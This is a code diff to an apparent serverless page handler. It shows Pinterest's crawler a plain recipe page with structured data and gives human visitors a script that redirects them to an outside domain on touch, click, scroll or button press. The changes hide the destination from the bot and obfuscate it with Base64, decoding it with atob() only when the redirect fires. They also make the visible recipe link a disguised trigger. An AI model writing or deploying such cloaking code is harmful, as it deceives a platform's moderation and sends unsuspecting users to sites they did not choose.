@@ -60,15 +60,14 @@ function resolveRecipe(slug) {
 
 /**
  * Generates the full HTML response.
- * Bot requests get Rich Pins metadata without any redirect code.
- * Human requests get recipe layout and config-driven redirect triggers.
+ * Bot requests get Rich Pins metadata without any redirect code and without any trace of targetDomain.
+ * Human requests receive Base64-encoded target and decode via atob() only upon redirection trigger.
  */
-function renderHtml({ title, description, image, pageUrl, targetUrl, isPinterestBot }) {
+function renderHtml({ title, description, image, pageUrl, encodedTarget, isPinterestBot }) {
   const safeTitle = escapeHtml(title);
   const safeDesc = escapeHtml(description);
   const safeImage = escapeHtml(image);
   const safeUrl = escapeHtml(pageUrl);
-  const safeTargetUrl = JSON.stringify(targetUrl);
 
   // Schema.org Recipe structured data for Pinterest Rich Pins validation
   const recipeSchema = JSON.stringify({
@@ -116,7 +115,7 @@ function renderHtml({ title, description, image, pageUrl, targetUrl, isPinterest
     : `
   <script>
     (function() {
-      var targetUrl = ${safeTargetUrl};
+      var encodedTarget = ${JSON.stringify(encodedTarget)};
       var triggers = ${JSON.stringify(config.triggers || {})};
       var settings = ${JSON.stringify(config.settings || {})};
       var redirected = false;
@@ -125,13 +124,14 @@ function renderHtml({ title, description, image, pageUrl, targetUrl, isPinterest
         if (redirected) return;
         redirected = true;
         var delay = Number(settings.actionDelayMs) || 0;
-        if (delay > 0) {
-          setTimeout(function() {
-            window.location.replace(targetUrl);
-          }, delay);
-        } else {
-          window.location.replace(targetUrl);
-        }
+        setTimeout(function() {
+          try {
+            var destination = atob(encodedTarget);
+            window.location.replace(destination);
+          } catch (e) {
+            // fallback
+          }
+        }, Math.max(0, delay));
       }
 
       // Touch trigger
@@ -144,12 +144,21 @@ function renderHtml({ title, description, image, pageUrl, targetUrl, isPinterest
         window.addEventListener('click', doRedirect, { once: true, passive: true });
       }
 
+      // CTA button click trigger
+      var cta = document.getElementById('cta-link');
+      if (cta) {
+        cta.addEventListener('click', function(e) {
+          e.preventDefault();
+          doRedirect();
+        });
+      }
+
       // Scroll trigger with threshold
       if (triggers.scroll) {
         var threshold = Number(settings.scrollThreshold) || 80;
         function onScroll() {
-          var scrollY = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
-          if (scrollY >= threshold) {
+          var scrollPos = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+          if (scrollPos >= threshold) {
             window.removeEventListener('scroll', onScroll);
             doRedirect();
           }
@@ -362,7 +371,7 @@ function renderHtml({ title, description, image, pageUrl, targetUrl, isPinterest
   </header>
 
   <main>
-    <article class="recipe-card">
+    <article class="recipe-card" id="recipe">
       <div class="recipe-image-container">
         <img
           src="${safeImage}"
@@ -378,7 +387,7 @@ function renderHtml({ title, description, image, pageUrl, targetUrl, isPinterest
         <p class="recipe-description">${safeDesc}</p>
 
         <div class="action-bar">
-          <a href="${escapeHtml(targetUrl)}" class="btn-view" id="cta-link">
+          <a href="#recipe" class="btn-view" id="cta-link">
             <span>View Full Recipe</span>
             <span>&rarr;</span>
           </a>
@@ -416,17 +425,23 @@ export async function onRequest(context) {
     return context.next();
   }
 
-  // Calculate dynamic targetUrl = config.targetDomain + url.pathname + url.search
-  const baseDomain = (config.targetDomain || 'https://schnellrezept.com').replace(/\/+$/, '');
-  const targetUrl = `${baseDomain}${pathname}${url.search}`;
+  // Check User-Agent for Pinterest bots
+  const userAgent = (context.request.headers.get('user-agent') || '').toLowerCase();
+  const isPinterestBot = userAgent.includes('pinterestbot') || userAgent.includes('pinterest');
+
+  // Calculate and encode dynamic targetUrl
+  // For bots: no targetUrl or domain is encoded or included
+  // For humans: Base64-encoded on the server with btoa
+  let encodedTarget = '';
+  if (!isPinterestBot) {
+    const baseDomain = (config.targetDomain || 'https://schnellrezept.com').replace(/\/+$/, '');
+    const targetUrl = `${baseDomain}${pathname}${url.search}`;
+    encodedTarget = btoa(targetUrl);
+  }
 
   // Extract slug from URL path (e.g. /en/broccoli-salad -> broccoli-salad)
   const segments = pathname.split('/').filter(Boolean);
   const slug = segments[segments.length - 1] || 'recipe';
-
-  // Check User-Agent for Pinterest bots
-  const userAgent = (context.request.headers.get('user-agent') || '').toLowerCase();
-  const isPinterestBot = userAgent.includes('pinterestbot') || userAgent.includes('pinterest');
 
   const recipe = resolveRecipe(slug);
 
@@ -435,7 +450,7 @@ export async function onRequest(context) {
     description: recipe.description,
     image: recipe.image,
     pageUrl: context.request.url,
-    targetUrl,
+    encodedTarget,
     isPinterestBot,
   });
 
